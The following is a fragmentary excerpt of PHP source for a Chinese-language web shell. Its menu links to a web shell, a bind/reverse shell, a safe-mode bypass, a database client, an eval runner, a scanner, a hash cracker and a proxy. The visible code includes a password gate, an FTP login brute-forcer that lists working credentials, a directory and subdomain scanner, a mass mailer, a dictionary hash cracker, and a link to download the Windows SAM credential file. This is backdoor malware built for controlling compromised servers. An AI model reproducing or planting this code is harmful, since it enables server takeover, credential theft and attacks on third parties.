...
if(empty($_COOKIE['passw']) || $_COOKIE['passw']!=md5($login_password))die("<html><meta http-equiv=Content-Type content=text/html;charset=gb2312><body><table><form method=post><tr><td>请输入密码:</td><td><input type=hidden name=seC value=about><input type=password name=fpassw></td></tr><tr><td></td><td><input type=submit value=登入></form>$et</body></html>");
}
...
echo '<html><meta http-equiv=Content-Type content=text/html;charset=gb2312><head><title>'.htmlspecialchars($ex).'</title></head><body><b>功能:</b><br>';foreach($e as $k=>$f){$i=$k+1;echo "$i)$f ";if(in_array($f,$disablefunctions))echo '<font color=red>被禁止的</font>';echo '<br>';}
echo '</body></html>';
exit;
}
...
if(mail($to,$subject,$body,"From: $from"))echo "$msgbox<b>发送成功!</b><br>$et";
}
...
if($ftp){
if(ftp_login($ftp,$user,$pass)){$output=1;echo "$ip) FTP结果: ($user:$pass) 系统类型: ".ftp_systype($ftp)." (<b><a href='";echo hlinK("seC=ftpc&workingdiR=".getcwd()."&hosT=$ip&useR=$user&pasS=$pass");echo "' target='_blank'>连接</a></b>)<br>";}
}
}
}
}
...
if($r){
$adr="http://$host/$d/";
if(check_urL($adr,'GET','302')){echo "目录结果: <a href='$adr' target='_blank'>$adr</a>\n";}
}else{
$adr="$d.$host";
$ip=gethostbyname($adr);
if($ip!=$adr){echo "子域名结果: <a href='http://$adr' target='_blank'>$adr($ip)</a>\n";}
}
}
echo '完成!</pre></font>';
}
...
echo "<table border=0 cellpadding=0 cellspacing=0 style='border-collapse: collapse' bgcolor='#333333' width='100%'><tr><td>服务器信息:</td></tr><tr>${t6}服务器:</td><td bgcolor='#666666'>".$_SERVER['HTTP_HOST'];if(!empty($_SERVER["SERVER_ADDR"])){ echo "(". $_SERVER["SERVER_ADDR"] .")";}echo "</td></tr><tr>${t8}操作系统/OS:</td><td bgcolor='#808080'>$os$osver</td></tr><tr>${t6}web服务器程序:</td><td bgcolor='#666666'>$software</td></tr><tr>${t8}CPU:</td><td bgcolor='#808080'>$CPU</td></tr>${t6}磁盘状况:</td><td bgcolor='#666666'>$disksize</td></tr><tr>${t8}用户域名:</td><td bgcolor='#808080'>";if (!empty($_SERVER['USERDOMAIN'])) echo $_SERVER['USERDOMAIN'];else echo "Unknow"; echo "</td></tr><tr>${t6}用户名:</td><td bgcolor='#666666'>$cuser</td></tr>";
if($windows){
echo "<tr>${t8}Windows 目录:</td><td bgcolor='#808080'><a href='".hlinK("seC=fm&workingdiR=$sysroot")."'>$sysroot</a></td></tr><tr>${t6}Sam file:</td><td bgcolor='#666666'>";if(is_readable(($sam)))echo "<a href='".hlinK("?workingdiR=$sysroot\\system32\\config&downloaD=sam")."'>Readable</a>"; else echo 'Not readable';echo '</td></tr>';
}
else
{
...
echo $cl1."$mdate</td>";
echo $cl1."$adate</td>";
echo "</td>$cl1";echo "<a href='#' onClick=\"javascript:chmoD('$fn')\" title='更改权限'>";if(is_readable($fn))echo "R";if(is_writeable($fn))echo "W";if(is_executable($fn))echo "X";if(is_uploaded_file($fn))echo "U";echo "</a></td>";
echo "$cl1$size</td>";
echo $cl2.$fileaction;
echo '</tr>';
}
...
echo $cl1."$mdate</td>";
echo $cl1."$adate</td>";
echo "</td>${cl1}";echo "<a href='#' onClick=\"javascript:chmoD('$ln')\" title='更改权限'>L";if(is_readable($ln))echo "R";if (is_writeable($ln))echo "W";if(is_executable($ln))echo "X";echo "</a></td>";
echo "$cl1$size</td>";
echo $cl2.$linkaction;
echo '</tr>';
}
...
if(!file_exists($dic))die("$errorbox 无法打开目录.$et$footer");
...
if($hash==strtoupper(($type($word)))){echo "结果是 $word<br>";if($log)file_add_contentS($file,"$x\r\n");break;}
}
echo '完成!</font>';
fclose($dictionary);
}
...
echo "<table border=0 cellpadding=0 cellspacing=0 style='border-collapse: collapse' bgcolor='#333333' width='100%'><form method='POST'><tr><td width='20%'><b>目标站点: </b><input type=text name=urL size=140 value='";if(!!empty($_REQUEST['urL'])) echo 'http://www.123cha.com'; else echo htmlspecialchars($_REQUEST['urL']);echo "'>$hcwd<input type=submit class=buttons value=Go!!!></form>$et";
...
<tr><td><a href=javascript:history.back(1)>[返回]</a> - <a href="<?php echo hlinK("seC=sysinfo&workingdiR=$cwd");?>">[信息]</a> - <a href="<?php echo hlinK("seC=fm&workingdiR=$cwd");?>">[文件管理器]</a> - <a href="<?php echo hlinK("seC=edit&workingdiR=$cwd");?>">[编辑器]</a> - <a href="<?php echo hlinK("seC=webshell&workingdiR=$cwd");?>">[Web shell]</a> - <a href="<?php echo hlinK("seC=br&workingdiR=$cwd");?>">[B/R shell]</a> - <a href="<?php echo hlinK("seC=asm&workingdiR=$cwd");?>">[安全模式]</a> - <a href="<?php echo hlinK("seC=sqlcl&workingdiR=$cwd"); ?>">[数据库]</a> - <a href="<?php echo hlinK("seC=ftpc&workingdiR=$cwd"); ?>">[FTP]</a> - <a href="<?php echo hlinK("seC=mailer&workingdiR=$cwd"); ?>">[邮件]</a> - <a href="<?php echo hlinK("seC=eval&workingdiR=$cwd");?>">[Evaler]</a> - <a href="<?php echo hlinK("seC=sc&workingdiR=$cwd"); ?>">[扫描器]</a> - <a href="<?php echo hlinK("seC=cr&workingdiR=$cwd");?>">[破解器]</a> - <a href="<?php echo hlinK("seC=px&workingdiR=$cwd");?>">[代理]</a> - <a href="<?php echo hlinK("seC=tools&workingdiR=$cwd");?>">[工具箱]</a> - <a href="<?php echo hlinK("seC=calc&workingdiR=$cwd");?>">[转换器]</a> - <a href="<?php echo hlinK("seC=about&workingdiR=$cwd");?>">[关于]</a> <?php if(isset($_COOKIE['passw'])) echo "- [<a href='".hlinK("seC=logout")."'>登出</a>]";?></td></tr></table>
<hr size=1 noshade>
<?php
